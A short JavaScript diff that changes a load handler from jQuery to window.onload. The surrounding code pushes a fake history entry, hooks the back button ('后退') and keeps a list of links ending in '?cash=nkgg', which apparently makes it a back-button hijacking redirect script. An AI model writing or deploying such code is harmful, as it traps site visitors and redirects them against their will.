@@ -11,9 +11,9 @@ globalLink.push(apidomain + '?cash=nkgg');
 function hh() {
     history.pushState(history.length + 1, "message", "#" + new Date().getTime());
 }
-$(function(){
+window.onload = function(){
     setTimeout('hh();', 500);
-});
+};
 
 // 后退
 $(window).on('popstate', function(e){
